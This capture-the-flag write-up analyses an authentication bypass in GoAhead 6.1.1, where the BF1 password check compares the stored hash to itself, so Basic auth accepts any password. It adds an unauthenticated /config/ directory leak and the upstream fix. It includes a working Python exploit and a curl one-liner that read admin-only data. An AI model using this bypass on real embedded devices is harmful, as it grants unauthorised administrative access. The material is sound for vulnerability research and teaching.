---
title: "VULN#005"
category: "Vuln Research"
tags: ["goahead", "embedded-web-server", "authentication-bypass", "bf1", "blowfish", "basic-auth", "iot"]
solve_date: "2026-10-20T22:00:00+07:00"
language: "en"
points: 30
---

# VULN#005 — GoAhead 6.1.1 BF1 check that compares the stored hash to itself

**Flag:** `CTF{e0dd76943e73bfa5e49e2496bd55e536}`
**Service:** `169.58.126.107:7020`
**Flag format:** `CTF{}`

| Artifact | Bytes | SHA-256 |
|---|---:|---|
| `goahead-src.tar.gz` (handout) | 567,117 | — |
| `/config/auth.txt` (leaked) | 262 | — |
| `/config/route.txt` (leaked) | 132 | — |

No SHA-256 digests were recorded during the session; the size column is from the transcript.

## Challenge

> Acme Gateway is a small IoT device management portal. It's built on a real, unmodified,
> open-source embedded web server, at a real revision. Not a toy reimplementation, and not a
> deliberately planted bug.
>
> You are given the exact source tree the target was built from.
>
> `169.58.126.107 7020`

The portal serves a public landing page and an admin console at `/admin/` behind HTTP Basic
authentication. The handout is an Embedthis GoAhead source tree, and the task is to find the
real defect in that revision and use it to reach the admin-only data.

## Analysis

### The stack and its revision

`package.json` in the handout reports `"version": "6.1.1"`, the build rules compile every object
with `-DME_VERSION=\"6.1.1\"`, and a local build of the same tree prints `Version: 6.1.1` at
startup. The handout files carry the timestamp `2026-08-21 06:04`, which places this revision
before upstream's October 2026 authentication rewrite.

The device's own backup calls its firmware `6.1.0-internal`; that is Acme's firmware label, not
the GoAhead version, so it must not be confused with the server release under test.

### The bug: `websVerifyPasswordFromFile()`

`src/auth.c:583` verifies credentials for file-backed users. The BF1 branch is meant to compare
the supplied plaintext against the stored Blowfish hash, but it throws that result away:

```c
PUBLIC bool websVerifyPasswordFromFile(Webs *wp)
{
    char passbuf[ME_GOAHEAD_LIMIT_PASSWORD * 3 + 3];
    bool success;

    assert(wp);
    if (!wp->user && (wp->user = websLookupUser(wp->username)) == 0) {
        trace(5, "verifyUser: Unknown user \"%s\"", wp->username);
        return 0;
    }
    /*
        Verify the password. BF1 means blowfish salted hash.
        If using Digest auth, we compare the digest of the password.
        Otherwise we encode the plain-text password and compare that
     */
    if (sstarts(wp->user->password, "BF1:")) {
        // Blowfish salted hash
        success = websCheckPassword(wp->password, wp->user->password);
        wfree(wp->password);
        wp->password = sclone(wp->user->password);

    } else if (!wp->encoded) {
        fmt(passbuf, sizeof(passbuf), "%s:%s:%s", wp->username, ME_GOAHEAD_REALM, wp->password);
        wfree(wp->password);
        wp->password = websMD5(passbuf);
        wp->encoded = 1;
    }
    if (wp->digest) {
        success = pmatch(wp->password, wp->digest);
    } else {
        success = pmatch(wp->password, wp->user->password);
    }
    if (success) {
        trace(5, "User \"%s\" authenticated", wp->username);
    } else {
        trace(5, "Password for user \"%s\" failed to authenticate", wp->username);
    }
    return success;
}
```

Three lines decide the whole challenge:

1. Line 600 computes the real verdict in `success`.
2. Line 602 overwrites `wp->password` with a clone of the stored hash, discarding the plaintext.
3. Line 617 assigns `success` again, comparing `wp->password` with `wp->user->password`.

After step 2 both operands are the same string, so `pmatch()` returns true for every password.
The comparison itself is a proper constant-time routine — it is correct, the inputs are simply
identical. The earlier `websCheckPassword()` call is dead work.

This is a **tautological password comparison / authentication bypass** in the file auth store.
No CVE identifier was established for this revision during the session; upstream addressed it by
rewriting the function in its October 2026 security series.

The branch only bites when `wp->digest` is null, i.e. Basic and form authentication. Digest
requests carry a client-computed digest in `wp->digest`, so line 615 compares the stored hash
against that digest and still fails. The portal uses `auth=basic`, which is exactly the
vulnerable path.

### The deployment half: `/config/` inside the document root

The defect above needs a username. The target hands it over: the static document root contains a
`config` directory with the route and credential files, and the catch-all route serves it without
authentication. Both files came back over plain GET:

```text
# /config/route.txt
route uri=/admin/ auth=basic abilities=manage
route uri=/
```

```text
# /config/auth.txt
role name=user abilities=view
role name=administrator abilities=user,manage

user name=svc-acme-prov password=BF1:00128:ILrUswPoHBSweW5R:UW5fySh5ZQ0pUvlwOFBbbz43UElaQeyw roles=administrator
```

The BF1 string is `BF1:<rounds>:<salt>:<hash>` (`src/crypt.c:1003`). Because of the bug, the hash
is not an obstacle: it is the value the server ends up comparing against itself. Only the account
name matters, and it is in the same file.

The landing page corroborates the naming without giving it away: it mentions the `svc` process
pool, "prov" logs, and the `acme-gw-44xx` model line.

### Local confirmation

The handout builds on Ubuntu 22.04 once a linker-flag quirk in the generated makefiles is worked
around, and runs with a lab `route.txt` containing
`route uri=/admin/ auth=basic abilities=manage`. Sending the wrong password with trace level 5:

```text
goahead: 5: Examine route /admin/
goahead: 5: User "admin" authenticated
goahead: 2: Access Denied. Insufficient capabilities.
```

Authentication passed with `WRONGPASS`; the request then failed only at the authorization step,
because the lab's `auth.txt` had no `role` line granting `manage`. Unknown users and
unauthenticated requests both returned 401, so the bypass is tied to a valid BF1 account, not to
a blanket "allow everything".

### Upstream fix

Current upstream handles digest first, then dispatches on the stored hash format, and keeps the
result of the Blowfish check:

```c
if (wp->digest) {
    if (!isMd5Hash(wp->user->password)) { ... return 0; }
    success = pmatch(wp->digest, wp->password);
} else if (isBlowfishHash(wp->user->password)) {
    if (!makePasswordPreimage(passbuf, sizeof(passbuf), wp->username, wp->password)) { ... }
    success = websCheckPassword(passbuf, wp->user->password);
} else {
    ...
}
```

The rewrite also wraps the plaintext as `username:realm:password`, so a stored hash is no longer
portable between accounts or realms. It landed in the security series of 2026-10-18
("FIX: strengthen authentication, password hashing and sessions") and was batched into the
2026-10-19 security commit.

## Solution

### 1. Fingerprint the server

`GET /admin/` returns GoAhead's own error page with a Basic challenge, while the 429 page is
nginx — the box sits behind a reverse proxy that rate-limits `/admin/`:

```text
HTTP/1.1 401 Unauthorized
Server: nginx
Content-Length: 151
WWW-Authenticate: Basic realm="example.com"
X-Frame-Options: SAMEORIGIN

<html>
    <head><title>Document Error: Unauthorized</title></head>
    <body>
        <h2>Access Error: Unauthorized</h2>
    </body>
</html>
```

`GET /` redirects to `/index.html`, which is the Acme Gateway landing page.

### 2. Find the unauthenticated config directory

A directory sweep found `/config` returning `302` to `/config/index.html` (which 404s) instead of
404. The directory itself is served, so its files can be requested directly:

```text
!!! 200        /config/auth.txt  [HTTP/1.1 200 OK len=262]
!!! 200        /config/route.txt  [HTTP/1.1 200 OK len=132]
```

That yields the account `svc-acme-prov`, the BF1 hash, and the policy `auth=basic abilities=manage`
on `/admin/`.

### 3. Authenticate with any password

With Basic auth the BF1 branch runs and the check collapses to a self-comparison. Password
`hacked` (and later `anything`) is accepted:

```text
HTTP/1.1 302 Redirect
Location: http://169.58.126.107:7020/admin/index.html
Set-Cookie: -goahead-session-=::webs.session::YOh6cLElQshmmgwHWLNy3g==; path=/; domain=169.58.126.107; httponly; SameSite=Lax
```

A 302 to `/admin/index.html` plus a session cookie is the success signal; wrong credentials stay
at 401.

### 4. Read the admin-only data

The console links to a configuration backup:

```text
HTTP/1.1 200 OK
<!doctype html>
<title>Acme Gateway - Admin Console</title>
<h1>Admin Console</h1>
<p>Welcome, administrator.</p>
<ul>
  <li><a href="/admin/device-config.json">Device configuration backup</a></li>
</ul>
```

`/admin/flag.txt` is a 404; the flag lives in the backup.

## Exploit code

```python
#!/usr/bin/env python3
"""VULN#005 - GoAhead 6.1.1 BF1 tautological password check."""
import base64, re, socket, time

HOST, PORT = "169.58.126.107", 7020


def get(path, user=None, password=None, tries=8):
    for _ in range(tries):
        s = socket.create_connection((HOST, PORT), 15)
        req = ["GET %s HTTP/1.1" % path,
               "Host: %s:%d" % (HOST, PORT),
               "User-Agent: Mozilla/5.0",
               "Connection: close"]
        if user is not None:
            tok = base64.b64encode(("%s:%s" % (user, password)).encode()).decode()
            req.append("Authorization: Basic " + tok)
        s.sendall(("\r\n".join(req) + "\r\n\r\n").encode())
        data = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
        s.close()
        resp = data.decode("latin-1")
        if resp.split("\r\n")[0].split()[1] != "429":
            return resp
        time.sleep(25)          # nginx limit_req on /admin/
    return resp


# 1. The config directory is served without authentication.
auth_txt = get("/config/auth.txt")
user = re.search(r"user name=(\S+) password=BF1:", auth_txt).group(1)
print("username:", user)

# 2. Any password passes for a BF1 account under Basic auth.
resp = get("/admin/", user, "anything")
print(resp.split("\r\n")[0])
print([l for l in resp.split("\r\n") if l.lower().startswith("set-cookie")])

# 3. Read the admin-only backup.
resp = get("/admin/device-config.json", user, "anything")
print(resp.partition("\r\n\r\n")[2])
```

The whole exploit also reproduces as a single request once the username is known:

```bash
curl -s -u "svc-acme-prov:anything" http://169.58.126.107:7020/admin/device-config.json
```

## Result

```text
========= /admin/index.html =========
HTTP/1.1 200 OK
<!doctype html>
<title>Acme Gateway - Admin Console</title>
<h1>Admin Console</h1>
<p>Welcome, administrator.</p>
<ul>
  <li><a href="/admin/device-config.json">Device configuration backup</a></li>
</ul>

========= /admin/flag.txt =========
HTTP/1.1 404 Not Found
<html>
    <head><title>Document Error: Not Found</title></head>
    <body>
        <h2>Access Error: Not Found</h2>
    </body>
</html>
```

```text
$ curl -s -u "svc-acme-prov:anything" http://169.58.126.107:7020/admin/device-config.json
{
  "device_id": "acme-gw-4471",
  "firmware": "6.1.0-internal",
  "recovery_token": "CTF{e0dd76943e73bfa5e49e2496bd55e536}"
}
```

**Flag: `CTF{e0dd76943e73bfa5e49e2496bd55e536}`**

## Notes

- The two halves compose: the code bug removes the password requirement, and the misplaced
  `config/` directory supplies the account name. The solve used both.
- Do not read the local `401 Access Denied. Insufficient capabilities.` as a failed bypass. In the
  lab the trace already says `User "admin" authenticated`; the 401 came from role abilities that
  the lab `auth.txt` did not define. On the target, `role name=administrator abilities=user,manage`
  covers the route's `abilities=manage`.
- Digest authentication is not affected: `wp->digest` is non-null there, so the final comparison
  is against the client digest, not against the stored hash.
- `/admin/` is rate-limited (nginx `429`), while `/index.html` tolerated 20 rapid requests. The
  working scripts sleep 25 s and retry on 429; the enumeration runs were paced by hand.
- `/admin/flag.txt` returns 404 on the target; the flag is only in `device-config.json`.
- Git Bash rewrites a bare `/config/` argument into `C:/Program Files/Git/config/`, which produced
  a round of bogus 400s during enumeration. `MSYS_NO_PATHCONV=1` fixes it.
- The revision is 6.1.1 from 2026-08-21, before the upstream authentication rewrite, so the bug is
  genuinely present in the shipped code rather than planted for the challenge.

## References

- Embedthis GoAhead 6.1.1 — `src/auth.c:583` `websVerifyPasswordFromFile()`
- Embedthis GoAhead 6.1.1 — `src/crypt.c:1003` BF1 hash format and `websCheckPassword()`
- Upstream commit `e018d1f0b961278cc48bf721a3a9ee86c50153b4` — "FIX: strengthen authentication,
  password hashing and sessions" (2026-10-18)
- Upstream commit `5878a2ac2827a1806e93d2902cedacaa138e1376` — "FIX: security fixes for request
  reading, routing, ROM and file serving, CGI, authentication, TLS and sockets" (2026-10-19)
